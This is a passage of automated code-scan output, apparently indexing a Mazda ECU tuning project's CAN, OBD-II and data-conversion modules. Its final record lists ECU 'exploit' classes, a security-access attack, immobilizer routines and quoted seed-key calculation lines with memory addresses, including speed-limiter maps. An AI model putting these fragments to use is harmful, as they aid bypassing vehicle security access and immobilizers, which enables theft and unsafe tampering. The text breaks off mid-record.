"logger.info(\"Disconnected from CAN interface\")"}, {"type": "protocol", "line": 115, "protocol": "CAN", "content": "logger.error(f\"Error disconnecting from CAN interface: {e}\")"}, {"type": "protocol", "line": 117, "protocol": "CAN", "content": "def send_frame(self, frame: CANFrame) -> bool:"}, {"type": "protocol", "line": 119, "protocol": "CAN", "content": "Send CAN frame"}, {"type": "protocol", "line": 122, "protocol": "CAN", "content": "frame: CAN frame to send"}, {"type": "protocol", "line": 129, "protocol": "CAN", "content": "logger.error(\"CAN interface not connected\")"}, {"type": "protocol", "line": 134, "protocol": "CAN", "content": "if frame.frame_type == CANFrameType.EXTENDED:"}, {"type": "protocol", "line": 135, "protocol": "CAN", "content": "can_id |= socket.CAN_EFF_FLAG"}, {"type": "protocol", "line": 136, "protocol": "CAN", "content": "elif frame.frame_type == CANFrameType.REMOTE:"}, {"type": "protocol", "line": 137, "protocol": "CAN", "content": "can_id |= socket.CAN_RTR_FLAG"}, {"type": "protocol", "line": 138, "protocol": "CAN", "content": "elif frame.frame_type == CANFrameType.ERROR:"}, {"type": "protocol", "line": 139, "protocol": "CAN", "content": "can_id |= socket.CAN_ERR_FLAG"}, {"type": "protocol", "line": 148, "protocol": "CAN", "content": "logger.debug(f\"Sent CAN frame: ID=0x{frame.frame_id:03X}, Data={frame.data.hex().upper()}\")"}, {"type": "protocol", "line": 151, "protocol": "CAN", "content": "logger.error(\"Failed to send CAN frame\")"}, {"type": "protocol", "line": 155, "protocol": "CAN", "content": "logger.error(f\"Error sending CAN frame: {e}\")"}, {"type": "protocol", "line": 158, "protocol": "CAN", "content": "def receive_frame(self, timeout: float = 1.0) -> Optional[CANFrame]:"}, {"type": "protocol", "line": 160, "protocol": "CAN", "content": "Receive CAN frame with timeout"}, {"type": "protocol", "line": 166, "protocol": "CAN", "content": "CAN frame or None if timeout"}, {"type": "protocol", "line": 170, "protocol": "CAN", "content": "logger.error(\"CAN interface not connected\")"}, {"type": "protocol", "line": 177, "protocol": "CAN", "content": "frame_data = self.socket.recv(16)  # CAN frame size"}, {"type": "protocol", "line": 185, "protocol": "CAN", "content": "frame_type = CANFrameType.STANDARD"}, {"type": "protocol", "line": 186, "protocol": "CAN", "content": "if can_id & socket.CAN_EFF_FLAG:"}, {"type": "protocol", "line": 187, "protocol": "CAN", "content": "frame_type = CANFrameType.EXTENDED"}, {"type": "protocol", "line": 188, "protocol": "CAN", "content": "can_id &= socket.CAN_EFF_MASK"}, {"type": "protocol", "line": 189, "protocol": "CAN", "content": "elif can_id & socket.CAN_RTR_FLAG:"}, {"type": "protocol", "line": 190, "protocol": "CAN", "content": "frame_type = CANFrameType.REMOTE"}, {"type": "protocol", "line": 191, "protocol": "CAN", "content": "can_id &= socket.CAN_RTR_FLAG"}, {"type": "protocol", "line": 192, "protocol": "CAN", "content": "elif can_id & socket.CAN_ERR_FLAG:"}, {"type": "protocol", "line": 193, "protocol": "CAN", "content": "frame_type = CANFrameType.ERROR"}, {"type": "protocol", "line": 194, "protocol": "CAN", "content": "can_id &= socket.CAN_ERR_MASK"}, {"type": "protocol", "line": 196, "protocol": "CAN", "content": "frame = CANFrame("}, {"type": "protocol", "line": 204, "protocol": "CAN", "content": "logger.debug(f\"Received CAN frame: ID=0x{frame.frame_id:03X}, Data={frame.data.hex().upper()}\")"}, {"type": "protocol", "line": 212, "protocol": "CAN", "content": "logger.error(f\"Error receiving CAN frame: {e}\")"}, {"type": "protocol", "line": 215, "protocol": "CAN", "content": "def start_receive_thread(self, callback: Callable[[CANFrame], None]):"}, {"type": "protocol", "line": 227, "protocol": "CAN", "content": "logger.info(\"Started CAN receive thread\")"}, {"type": "protocol", "line": 239, "protocol": "CAN", "content": "logger.info(\"Stopped CAN receive thread\")"}, {"type": "protocol", "line": 258, "protocol": "0x[0-9A-Fa-f]+", "content": "source_address: int = 0x7DF) -> bool:"}, {"type": "protocol", "line": 260, "protocol": "CAN", "content": "Send diagnostic message over CAN"}, {"type": "protocol", "line": 275, "protocol": "0x[0-9A-Fa-f]+", "content": "frame_data = bytes([0x00 | len(data)]) + data"}, {"type": "protocol", "line": 278, "protocol": "CAN", "content": "frame = CANFrame("}, {"type": "protocol", "line": 281, "protocol": "CAN", "content": "frame_type=CANFrameType.STANDARD"}, {"type": "protocol", "line": 298, "protocol": "CAN", "content": "Receive diagnostic message from CAN"}, {"type": "protocol", "line": 316, "protocol": "0x[0-9A-Fa-f]+", "content": "if pci & 0xF0 == 0x00:  # Single frame"}, {"type": "protocol", "line": 317, "protocol": "0x[0-9A-Fa-f]+", "content": "data_length = pci & 0x0F"}, {"type": "protocol", "line": 329, "protocol": "CAN", "content": "Monitor CAN bus traffic"}, {"type": "protocol", "line": 337, "protocol": "CAN", "content": "logger.info(f\"Monitoring CAN bus traffic for {duration} seconds\")"}, {"type": "protocol", "line": 364, "protocol": "CAN", "content": "if frame.frame_type == CANFrameType.ERROR:"}, {"type": "protocol", "line": 376, "protocol": "CAN", "content": "logger.info(f\"CAN bus monitoring completed: {frame_count} frames analyzed\")"}, {"type": "protocol", "line": 380, "protocol": "CAN", "content": "logger.error(f\"Error monitoring CAN bus traffic: {e}\")"}, {"type": "protocol", "line": 384, "protocol": "CAN", "content": "def _identify_mazda_message(self, frame: CANFrame) -> Optional[Dict[str, Any]]:"}, {"type": "protocol", "line": 385, "protocol": "CAN", "content": "\"\"\"Identify Mazda-specific CAN messages\"\"\""}, {"type": "protocol", "line": 405, "protocol": "CAN", "content": "Perform CAN bus health check"}, {"type": "protocol", "line": 465, "protocol": "CAN", "content": "logger.info(\"CAN bus health check completed\")"}, {"type": "protocol", "line": 475, "protocol": "CAN", "content": "Set CAN bus bitrate"}, {"type": "protocol", "line": 487, "protocol": "CAN", "content": "logger.info(f\"CAN bitrate set to {bitrate} bps\")"}, {"type": "protocol", "line": 491, "protocol": "CAN", "content": "logger.error(f\"Error setting CAN bitrate: {e}\")"}, {"type": "protocol", "line": 496, "protocol": "CAN", "content": "Get CAN interface status"}], "hardware_assumptions": [{"type": "hardware", "line": 4, "hardware": "CAN bus", "content": "CAN INTERFACE - Complete CAN Bus Communication"}, {"type": "hardware", "line": 5, "hardware": "vehicle", "content": "Direct CAN interface implementation for Mazda vehicles"}, {"type": "hardware", "line": 37, "hardware": "vehicle", "content": "Complete CAN Interface for Mazda Vehicle Communication"}, {"type": "hardware", "line": 38, "hardware": "CAN bus", "content": "Provides direct CAN bus access for advanced diagnostics"}, {"type": "hardware", "line": 52, "hardware": "ECU", "content": "'ECU_TX': 0x7E0,"}, {"type": "hardware", "line": 53, "hardware": "ECU", "content": "'ECU_RX': 0x7E8,"}, {"type": "hardware", "line": 54, "hardware": "TCM", "content": "'TCM_TX': 0x7E1,"}, {"type": "hardware", "line": 55, "hardware": "TCM", "content": "'TCM_RX': 0x7E9,"}, {"type": "hardware", "line": 56, "hardware": "ABS", "content": "'ABS_TX': 0x7E2,"}, {"type": "hardware", "line": 57, "hardware": "ABS", "content": "'ABS_RX': 0x7EA,"}, {"type": "hardware", "line": 58, "hardware": "BCM", "content": "'BCM_TX': 0x7E6,"}, {"type": "hardware", "line": 59, "hardware": "BCM", "content": "'BCM_RX': 0x7EE,"}, {"type": "hardware", "line": 263, "hardware": "ECU", "content": "target_address: Target ECU address"}, {"type": "hardware", "line": 329, "hardware": "CAN bus", "content": "Monitor CAN bus traffic"}, {"type": "hardware", "line": 337, "hardware": "CAN bus", "content": "logger.info(f\"Monitoring CAN bus traffic for {duration} seconds\")"}, {"type": "hardware", "line": 376, "hardware": "CAN bus", "content": "logger.info(f\"CAN bus monitoring completed: {frame_count} frames analyzed\")"}, {"type": "hardware", "line": 380, "hardware": "CAN bus", "content": "logger.error(f\"Error monitoring CAN bus traffic: {e}\")"}, {"type": "hardware", "line": 405, "hardware": "CAN bus", "content": "Perform CAN bus health check"}, {"type": "hardware", "line": 453, "hardware": "ECU", "content": "mazda_ecus_found = 0"}, {"type": "hardware", "line": 455, "hardware": "ECU", "content": "if any(ecu in msg.get('message_type', '') for ecu in ['ECU', 'TCM', 'ABS', 'BCM']):"}, {"type": "hardware", "line": 455, "hardware": "TCM", "content": "if any(ecu in msg.get('message_type', '') for ecu in ['ECU', 'TCM', 'ABS', 'BCM']):"}, {"type": "hardware", "line": 455, "hardware": "BCM", "content": "if any(ecu in msg.get('message_type', '') for ecu in ['ECU', 'TCM', 'ABS', 'BCM']):"}, {"type": "hardware", "line": 455, "hardware": "ABS", "content": "if any(ecu in msg.get('message_type', '') for ecu in ['ECU', 'TCM', 'ABS', 'BCM']):"}, {"type": "hardware", "line": 456, "hardware": "ECU", "content": "mazda_ecus_found += 1"}, {"type": "hardware", "line": 458, "hardware": "ECU", "content": "if mazda_ecus_found >= 3:"}, {"type": "hardware", "line": 459, "hardware": "ECU", "content": "health_status['recommendations'].append(\"Multiple Mazda ECUs detected - bus communication normal\")"}, {"type": "hardware", "line": 460, "hardware": "ECU", "content": "elif mazda_ecus_found > 0:"}, {"type": "hardware", "line": 461, "hardware": "ECU", "content": "health_status['recommendations'].append(\"Some Mazda ECUs detected - check missing modules\")"}, {"type": "hardware", "line": 463, "hardware": "ECU", "content": "health_status['recommendations'].append(\"No Mazda ECUs detected - check vehicle connection\")"}, {"type": "hardware", "line": 463, "hardware": "vehicle", "content": "health_status['recommendations'].append(\"No Mazda ECUs detected - check vehicle connection\")"}, {"type": "hardware", "line": 465, "hardware": "CAN bus", "content": "logger.info(\"CAN bus health check completed\")"}, {"type": "hardware", "line": 475, "hardware": "CAN bus", "content": "Set CAN bus bitrate"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts_tuner/complete_tuner/mds13.py", "lines_read": 612, "features_found": [{"type": "function", "name": "__init__", "line": 35}, {"type": "function", "name": "connect", "line": 44}, {"type": "function", "name": "_initialize_obd", "line": 80}, {"type": "function", "name": "_auto_detect_protocol", "line": 124}, {"type": "function", "name": "disconnect", "line": 147}, {"type": "function", "name": "_send_command", "line": 160}, {"type": "function", "name": "read_pid", "line": 201}, {"type": "function", "name": "_parse_pid_response", "line": 224}, {"type": "function", "name": "read_multiple_pids", "line": 285}, {"type": "function", "name": "read_live_data", "line": 304}, {"type": "function", "name": "_calculate_live_data_statistics", "line": 361}, {"type": "function", "name": "read_diagnostic_trouble_codes", "line": 386}, {"type": "function", "name": "_parse_dtc_code", "line": 426}, {"type": "function", "name": "clear_diagnostic_trouble_codes", "line": 451}, {"type": "function", "name": "read_vehicle_information", "line": 471}, {"type": "function", "name": "_update_supported_pids", "line": 519}, {"type": "function", "name": "get_supported_pids", "line": 543}, {"type": "function", "name": "perform_obd_health_check", "line": 552}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "serial", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "IntEnum", "line": null}], "components_found": [{"type": "class", "name": "OBDProtocol", "line": 16}, {"type": "class", "name": "MazdaOBDInterface", "line": 29}], "algorithms": [{"type": "algorithm_function", "line": 361, "content": "def _calculate_live_data_statistics(self, samples: List[Dict[str, Any]]) -> Dict[str, Any]:"}], "protocols": [{"type": "protocol", "line": 4, "protocol": "OBD", "content": "OBD INTERFACE - Complete OBD-II Implementation"}, {"type": "protocol", "line": 5, "protocol": "OBD", "content": "Standard OBD-II interface for Mazda vehicles"}, {"type": "protocol", "line": 16, "protocol": "OBD", "content": "class OBDProtocol(IntEnum):"}, {"type": "protocol", "line": 17, "protocol": "OBD", "content": "\"\"\"OBD-II Protocols\"\"\""}, {"type": "protocol", "line": 20, "protocol": "KWP", "content": "ISO_14230_4_KWP = 2"}, {"type": "protocol", "line": 21, "protocol": "KWP", "content": "ISO_14230_4_KWP_FAST = 3"}, {"type": "protocol", "line": 22, "protocol": "CAN", "content": "ISO_15765_4_CAN_11B_500K = 4"}, {"type": "protocol", "line": 23, "protocol": "CAN", "content": "ISO_15765_4_CAN_29B_500K = 5"}, {"type": "protocol", "line": 24, "protocol": "CAN", "content": "ISO_15765_4_CAN_11B_250K = 6"}, {"type": "protocol", "line": 25, "protocol": "CAN", "content": "ISO_15765_4_CAN_29B_250K = 7"}, {"type": "protocol", "line": 29, "protocol": "OBD", "content": "class MazdaOBDInterface:"}, {"type": "protocol", "line": 31, "protocol": "OBD", "content": "Complete OBD-II Interface for Mazda Vehicles"}, {"type": "protocol", "line": 32, "protocol": "OBD", "content": "Provides standard OBD-II communication with Mazda-specific extensions"}, {"type": "protocol", "line": 36, "protocol": "OBD", "content": "protocol: OBDProtocol = OBDProtocol.AUTO):"}, {"type": "protocol", "line": 46, "protocol": "OBD", "content": "Connect to OBD-II interface"}, {"type": "protocol", "line": 52, "protocol": "OBD", "content": "logger.info(f\"Connecting to OBD-II interface: {self.port}\")"}, {"type": "protocol", "line": 66, "protocol": "OBD", "content": "logger.error(\"Failed to initialize OBD connection\")"}, {"type": "protocol", "line": 72, "protocol": "OBD", "content": "logger.info(\"Successfully connected to OBD-II interface\")"}, {"type": "protocol", "line": 76, "protocol": "OBD", "content": "logger.error(f\"Failed to connect to OBD-II interface: {e}\")"}, {"type": "protocol", "line": 81, "protocol": "OBD", "content": "\"\"\"Initialize OBD connection\"\"\""}, {"type": "protocol", "line": 94, "protocol": "OBD", "content": "if self.protocol == OBDProtocol.AUTO:"}, {"type": "protocol", "line": 100, "protocol": "CAN", "content": "self.protocol = OBDProtocol.ISO_15765_4_CAN_11B_500K"}, {"type": "protocol", "line": 100, "protocol": "OBD", "content": "self.protocol = OBDProtocol.ISO_15765_4_CAN_11B_500K"}, {"type": "protocol", "line": 107, "protocol": "OBD", "content": "self.protocol = OBDProtocol.AUTO"}, {"type": "protocol", "line": 121, "protocol": "OBD", "content": "logger.error(f\"Error initializing OBD: {e}\")"}, {"type": "protocol", "line": 124, "protocol": "OBD", "content": "def _auto_detect_protocol(self) -> Optional[OBDProtocol]:"}, {"type": "protocol", "line": 125, "protocol": "OBD", "content": "\"\"\"Auto-detect OBD protocol\"\"\""}, {"type": "protocol", "line": 127, "protocol": "CAN", "content": "OBDProtocol.ISO_15765_4_CAN_11B_500K,  # Most common for modern Mazdas"}, {"type": "protocol", "line": 127, "protocol": "OBD", "content": "OBDProtocol.ISO_15765_4_CAN_11B_500K,  # Most common for modern Mazdas"}, {"type": "protocol", "line": 128, "protocol": "OBD", "content": "OBDProtocol.ISO_14230_4_KWP,           # KWP2000 for older Mazdas"}, {"type": "protocol", "line": 128, "protocol": "KWP", "content": "OBDProtocol.ISO_14230_4_KWP,           # KWP2000 for older Mazdas"}, {"type": "protocol", "line": 129, "protocol": "OBD", "content": "OBDProtocol.ISO_9141_2,                # K-line for older vehicles"}, {"type": "protocol", "line": 148, "protocol": "OBD", "content": "\"\"\"Disconnect from OBD-II interface\"\"\""}, {"type": "protocol", "line": 155, "protocol": "OBD", "content": "logger.info(\"Disconnected from OBD-II interface\")"}, {"type": "protocol", "line": 158, "protocol": "OBD", "content": "logger.error(f\"Error disconnecting from OBD-II interface: {e}\")"}, {"type": "protocol", "line": 162, "protocol": "OBD", "content": "Send command to OBD interface and read response"}, {"type": "protocol", "line": 165, "protocol": "OBD", "content": "command: OBD command to send"}, {"type": "protocol", "line": 172, "protocol": "OBD", "content": "logger.error(\"OBD interface not connected\")"}, {"type": "protocol", "line": 194, "protocol": "OBD", "content": "logger.debug(f\"OBD Command: {command} -> Response: {response}\")"}, {"type": "protocol", "line": 198, "protocol": "OBD", "content": "logger.error(f\"Error sending OBD command: {e}\")"}, {"type": "protocol", "line": 203, "protocol": "OBD", "content": "Read OBD PID value"}, {"type": "protocol", "line": 203, "protocol": "PID", "content": "Read OBD PID value"}, {"type": "protocol", "line": 206, "protocol": "PID", "content": "pid: PID to read (e.g., \"010C\" for RPM)"}, {"type": "protocol", "line": 209, "protocol": "PID", "content": "PID data or None if failed"}, {"type": "protocol", "line": 221, "protocol": "PID", "content": "logger.error(f\"Error reading PID {pid}: {e}\")"}, {"type": "protocol", "line": 225, "protocol": "PID", "content": "\"\"\"Parse PID response\"\"\""}, {"type": "protocol", "line": 281, "protocol": "PID", "content": "logger.error(f\"Error parsing PID response: {e}\")"}, {"type": "protocol", "line": 287, "protocol": "PID", "content": "Read multiple PIDs"}, {"type": "protocol", "line": 290, "protocol": "PID", "content": "pids: List of PIDs to read"}, {"type": "protocol", "line": 293, "protocol": "PID", "content": "Dictionary of PID values"}, {"type": "protocol", "line": 306, "protocol": "PID", "content": "Read live data from multiple PIDs over time"}, {"type": "protocol", "line": 309, "protocol": "PID", "content": "pids: PIDs to monitor"}, {"type": "protocol", "line": 435, "protocol": "0x[0-9A-Fa-f]+", "content": "dtc_type = (first_byte >> 6) & 0x03"}, {"type": "protocol", "line": 440, "protocol": "0x[0-9A-Fa-f]+", "content": "digit1 = (first_byte >> 4) & 0x03"}, {"type": "protocol", "line": 441, "protocol": "0x[0-9A-Fa-f]+", "content": "digit2 = first_byte & 0x0F"}, {"type": "protocol", "line": 520, "protocol": "PID", "content": "\"\"\"Update list of supported PIDs\"\"\""}, {"type": "protocol", "line": 534, "protocol": "0x[0-9A-Fa-f]+", "content": "pid_num = (i//2) * 0x20 + bit + 1"}, {"type": "protocol", "line": 538, "protocol": "PID", "content": "logger.debug(f\"Supported PIDs: {list(self.vehicle_supported_pids.keys())}\")"}, {"type": "protocol", "line": 541, "protocol": "PID", "content": "logger.error(f\"Error updating supported PIDs: {e}\")"}, {"type": "protocol", "line": 545, "protocol": "PID", "content": "Get list of supported PIDs"}, {"type": "protocol", "line": 548, "protocol": "PID", "content": "List of supported PID codes"}, {"type": "protocol", "line": 554, "protocol": "OBD", "content": "Perform OBD system health check"}, {"type": "protocol", "line": 575, "protocol": "OBD", "content": "health_status['recommendations'].append(\"Check OBD connection and protocol\")"}, {"type": "protocol", "line": 590, "protocol": "0x[0-9A-Fa-f]+", "content": "if status_byte & 0x80:  # MIL status"}, {"type": "protocol", "line": 600, "protocol": "PID", "content": "health_status['recommendations'].append(\"No supported PIDs detected - check protocol\")"}, {"type": "protocol", "line": 602, "protocol": "PID", "content": "health_status['recommendations'].append(\"Limited PID support - vehicle may have restrictions\")"}, {"type": "protocol", "line": 604, "protocol": "PID", "content": "health_status['recommendations'].append(\"Good PID support detected\")"}, {"type": "protocol", "line": 606, "protocol": "OBD", "content": "logger.info(\"OBD health check completed\")"}, {"type": "protocol", "line": 610, "protocol": "OBD", "content": "logger.error(f\"Error performing OBD health check: {e}\")"}], "hardware_assumptions": [{"type": "hardware", "line": 5, "hardware": "vehicle", "content": "Standard OBD-II interface for Mazda vehicles"}, {"type": "hardware", "line": 31, "hardware": "vehicle", "content": "Complete OBD-II Interface for Mazda Vehicles"}, {"type": "hardware", "line": 42, "hardware": "vehicle", "content": "self.vehicle_supported_pids = {}"}, {"type": "hardware", "line": 117, "hardware": "vehicle", "content": "logger.error(\"No response from vehicle\")"}, {"type": "hardware", "line": 129, "hardware": "vehicle", "content": "OBDProtocol.ISO_9141_2,                # K-line for older vehicles"}, {"type": "hardware", "line": 248, "hardware": "vehicle", "content": "elif pid == \"010D\":  # Vehicle Speed"}, {"type": "hardware", "line": 471, "hardware": "vehicle", "content": "def read_vehicle_information(self) -> Dict[str, Any]:"}, {"type": "hardware", "line": 473, "hardware": "vehicle", "content": "Read vehicle information"}, {"type": "hardware", "line": 476, "hardware": "vehicle", "content": "Vehicle information"}, {"type": "hardware", "line": 478, "hardware": "vehicle", "content": "vehicle_info = {}"}, {"type": "hardware", "line": 494, "hardware": "vehicle", "content": "vehicle_info['vin'] = vin.strip()"}, {"type": "hardware", "line": 508, "hardware": "vehicle", "content": "vehicle_info['calibration_id'] = cal_id.strip()"}, {"type": "hardware", "line": 512, "hardware": "vehicle", "content": "return vehicle_info"}, {"type": "hardware", "line": 515, "hardware": "vehicle", "content": "logger.error(f\"Error reading vehicle information: {e}\")"}, {"type": "hardware", "line": 516, "hardware": "vehicle", "content": "vehicle_info['error'] = str(e)"}, {"type": "hardware", "line": 517, "hardware": "vehicle", "content": "return vehicle_info"}, {"type": "hardware", "line": 536, "hardware": "vehicle", "content": "self.vehicle_supported_pids[pid_hex] = True"}, {"type": "hardware", "line": 538, "hardware": "vehicle", "content": "logger.debug(f\"Supported PIDs: {list(self.vehicle_supported_pids.keys())}\")"}, {"type": "hardware", "line": 550, "hardware": "vehicle", "content": "return list(self.vehicle_supported_pids.keys())"}, {"type": "hardware", "line": 562, "hardware": "vehicle", "content": "'supported_pids': len(self.vehicle_supported_pids),"}, {"type": "hardware", "line": 602, "hardware": "vehicle", "content": "health_status['recommendations'].append(\"Limited PID support - vehicle may have restrictions\")"}], "security_logic": [{"type": "security_pattern", "line": 370, "pattern": "key", "content": "pids = list(first_sample['values'].keys())"}, {"type": "security_pattern", "line": 538, "pattern": "key", "content": "logger.debug(f\"Supported PIDs: {list(self.vehicle_supported_pids.keys())}\")"}, {"type": "security_pattern", "line": 550, "pattern": "key", "content": "return list(self.vehicle_supported_pids.keys())"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts_tuner/complete_tuner/mds14.py", "lines_read": 571, "features_found": [{"type": "function", "name": "bytes_to_uint8", "line": 31}, {"type": "function", "name": "bytes_to_int8", "line": 38}, {"type": "function", "name": "bytes_to_uint16", "line": 48}, {"type": "function", "name": "bytes_to_int16", "line": 59}, {"type": "function", "name": "bytes_to_uint32", "line": 67}, {"type": "function", "name": "bytes_to_float", "line": 80}, {"type": "function", "name": "mazda_rpm_to_bytes", "line": 89}, {"type": "function", "name": "bytes_to_mazda_rpm", "line": 96}, {"type": "function", "name": "mazda_temperature_to_bytes", "line": 102}, {"type": "function", "name": "bytes_to_mazda_temperature", "line": 109}, {"type": "function", "name": "mazda_pressure_to_bytes", "line": 115}, {"type": "function", "name": "bytes_to_mazda_pressure", "line": 121}, {"type": "function", "name": "mazda_voltage_to_bytes", "line": 127}, {"type": "function", "name": "bytes_to_mazda_voltage", "line": 133}, {"type": "function", "name": "mazda_angle_to_bytes", "line": 139}, {"type": "function", "name": "bytes_to_mazda_angle", "line": 145}, {"type": "function", "name": "decode_maf_signal", "line": 151}, {"type": "function", "name": "decode_map_signal", "line": 173}, {"type": "function", "name": "decode_tps_signal", "line": 192}, {"type": "function", "name": "decode_oxygen_sensor_signal", "line": 215}, {"type": "function", "name": "calculate_injector_pulse_width", "line": 238}, {"type": "function", "name": "calculate_ignition_timing", "line": 264}, {"type": "function", "name": "calculate_boost_target", "line": 306}, {"type": "function", "name": "convert_afr_to_lambda", "line": 349}, {"type": "function", "name": "convert_lambda_to_afr", "line": 371}, {"type": "function", "name": "calculate_horsepower", "line": 392}, {"type": "function", "name": "calculate_torque", "line": 406}, {"type": "function", "name": "psi_to_kpa", "line": 422}, {"type": "function", "name": "kpa_to_psi", "line": 427}, {"type": "function", "name": "celsius_to_fahrenheit", "line": 432}, {"type": "function", "name": "fahrenheit_to_celsius", "line": 437}, {"type": "function", "name": "decode_mazda_vin", "line": 442}, {"type": "function", "name": "encode_calibration_map", "line": 496}, {"type": "function", "name": "decode_calibration_map", "line": 531}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "math", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "IntEnum", "line": null}], "components_found": [{"type": "class", "name": "MazdaDataConverter", "line": 13}], "algorithms": [{"type": "algorithm_function", "line": 238, "content": "def calculate_injector_pulse_width(rpm: float, load: float,"}, {"type": "algorithm_function", "line": 264, "content": "def calculate_ignition_timing(base_timing: float, rpm: float, load: float,"}, {"type": "algorithm_function", "line": 306, "content": "def calculate_boost_target(rpm: float, gear: int,"}, {"type": "algorithm_function", "line": 392, "content": "def calculate_horsepower(torque: float, rpm: float) -> float:"}, {"type": "algorithm_function", "line": 406, "content": "def calculate_torque(horsepower: float, rpm: float) -> float:"}], "protocols": [{"type": "protocol", "line": 520, "protocol": "0x[0-9A-Fa-f]+", "content": "encoded_data.append(max(-128, min(127, int_value)) & 0xFF)"}], "hardware_assumptions": [{"type": "hardware", "line": 458, "hardware": "vehicle", "content": "\"vds\": vin[3:9], # Vehicle Descriptor Section"}, {"type": "hardware", "line": 459, "hardware": "vehicle", "content": "\"vis\": vin[9:]   # Vehicle Identifier Section"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts_tuner/complete_tuner/mds15.py", "lines_read": 456, "features_found": [{"type": "function", "name": "main", "line": 389}, {"type": "function", "name": "__init__", "line": 18}, {"type": "function", "name": "reverse_engineer_seed_key", "line": 23}, {"type": "function", "name": "_mazda_27_algorithm", "line": 50}, {"type": "function", "name": "_mazda_tcm_algorithm", "line": 64}, {"type": "function", "name": "_mazda_immobilizer_algorithm", "line": 77}, {"type": "function", "name": "_derive_vin_key", "line": 91}, {"type": "function", "name": "map_ecu_memory", "line": 102}, {"type": "function", "name": "__init__", "line": 130}, {"type": "function", "name": "define_safety_limits", "line": 135}, {"type": "function", "name": "real_time_optimization", "line": 147}, {"type": "function", "name": "_optimize_timing", "line": 164}, {"type": "function", "name": "_optimize_boost", "line": 182}, {"type": "function", "name": "_optimize_fuel", "line": 198}, {"type": "function", "name": "_optimize_vvt", "line": 213}, {"type": "function", "name": "_apply_safety_limits", "line": 225}, {"type": "function", "name": "_learn_from_optimization", "line": 242}, {"type": "function", "name": "__init__", "line": 260}, {"type": "function", "name": "enumerate_j2534_exploits", "line": 264}, {"type": "function", "name": "execute_memory_dump", "line": 290}, {"type": "function", "name": "_build_read_memory_payload", "line": 311}, {"type": "function", "name": "__init__", "line": 326}, {"type": "function", "name": "enumerate_ecu_ids", "line": 330}, {"type": "function", "name": "inject_diagnostic_session", "line": 341}, {"type": "function", "name": "security_access_attack", "line": 357}, {"type": "import", "module": "cryptography.hazmat.primitives.ciphers", "line": null}, {"type": "import", "module": "cryptography.hazmat.backends", "line": null}, {"type": "import", "module": "can", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "hashlib", "line": null}, {"type": "import", "module": "Cipher,", "line": null}, {"type": "import", "module": "default_backend", "line": null}], "components_found": [{"type": "class", "name": "MazdaECUExploit", "line": 15}, {"type": "class", "name": "AutonomousTuner", "line": 127}, {"type": "class", "name": "DiagnosticExploits", "line": 257}, {"type": "class", "name": "CANInjection", "line": 323}], "algorithms": [{"type": "algorithm_function", "line": 50, "content": "def _mazda_27_algorithm(self, seed):"}, {"type": "algorithm_function", "line": 64, "content": "def _mazda_tcm_algorithm(self, seed):"}, {"type": "algorithm_function", "line": 77, "content": "def _mazda_immobilizer_algorithm(self, seed):"}, {"type": "algorithm_function", "line": 91, "content": "def _derive_vin_key(self):"}], "protocols": [{"type": "protocol", "line": 27, "protocol": "0x[0-9A-Fa-f]+", "content": "'description': 'Main ECU security access (0x27)',"}, {"type": "protocol", "line": 51, "protocol": "0x[0-9A-Fa-f]+", "content": "\"\"\"MAIN ECU 0x27 SECURITY ALGORITHM - FACTORY DEALER LEVEL\"\"\""}, {"type": "protocol", "line": 58, "protocol": "0x[0-9A-Fa-f]+", "content": "key[i] = (seed_bytes[i] ^ 0x73) + i"}, {"type": "protocol", "line": 59, "protocol": "0x[0-9A-Fa-f]+", "content": "key[i] = (key[i] & 0xFF) ^ 0xA9"}, {"type": "protocol", "line": 60, "protocol": "0x[0-9A-Fa-f]+", "content": "key[i] = (key[i] + 0x1F) & 0xFF"}, {"type": "protocol", "line": 70, "protocol": "0x[0-9A-Fa-f]+", "content": "key[0] = ((seed_bytes[0] << 2) | (seed_bytes[0] >> 6)) & 0xFF"}, {"type": "protocol", "line": 71, "protocol": "0x[0-9A-Fa-f]+", "content": "key[1] = ((seed_bytes[1] >> 3) | (seed_bytes[1] << 5)) & 0xFF"}, {"type": "protocol", "line": 72, "protocol": "0x[0-9A-Fa-f]+", "content": "key[0] ^= 0x47"}, {"type": "protocol", "line": 73, "protocol": "0x[0-9A-Fa-f]+", "content": "key[1] ^= 0x11"}, {"type": "protocol", "line": 106, "protocol": "0x[0-9A-Fa-f]+", "content": "'ignition_timing': {'address': 0xFFA000, 'size': 0x800, 'description': '16x16 ignition map'},"}, {"type": "protocol", "line": 107, "protocol": "0x[0-9A-Fa-f]+", "content": "'fuel_maps': {'address': 0xFFA800, 'size': 0x800, 'description': '16x16 fuel map'},"}, {"type": "protocol", "line": 108, "protocol": "0x[0-9A-Fa-f]+", "content": "'boost_control': {'address': 0xFFB000, 'size': 0x400, 'description': 'Boost target maps'},"}, {"type": "protocol", "line": 109, "protocol": "0x[0-9A-Fa-f]+", "content": "'vvt_maps': {'address': 0xFFB400, 'size': 0x400, 'description': 'Variable valve timing'},"}, {"type": "protocol", "line": 110, "protocol": "0x[0-9A-Fa-f]+", "content": "'rev_limit': {'address': 0xFFB800, 'size': 0x100, 'description': 'RPM limiters'},"}, {"type": "protocol", "line": 111, "protocol": "0x[0-9A-Fa-f]+", "content": "'speed_limit': {'address': 0xFFB900, 'size': 0x100, 'description': 'Speed governor'}"}, {"type": "protocol", "line": 114, "protocol": "0x[0-9A-Fa-f]+", "content": "'knock_learn': {'address': 0xFFC000, 'size': 0x200, 'description': 'Knock adaptation'},"}, {"type": "protocol", "line": 115, "protocol": "0x[0-9A-Fa-f]+", "content": "'fuel_trim': {'address': 0xFFC200, 'size': 0x200, 'description': 'Long/short term fuel trims'},"}, {"type": "protocol", "line": 116, "protocol": "0x[0-9A-Fa-f]+", "content": "'throttle_adapt': {'address': 0xFFC400, 'size': 0x100, 'description': 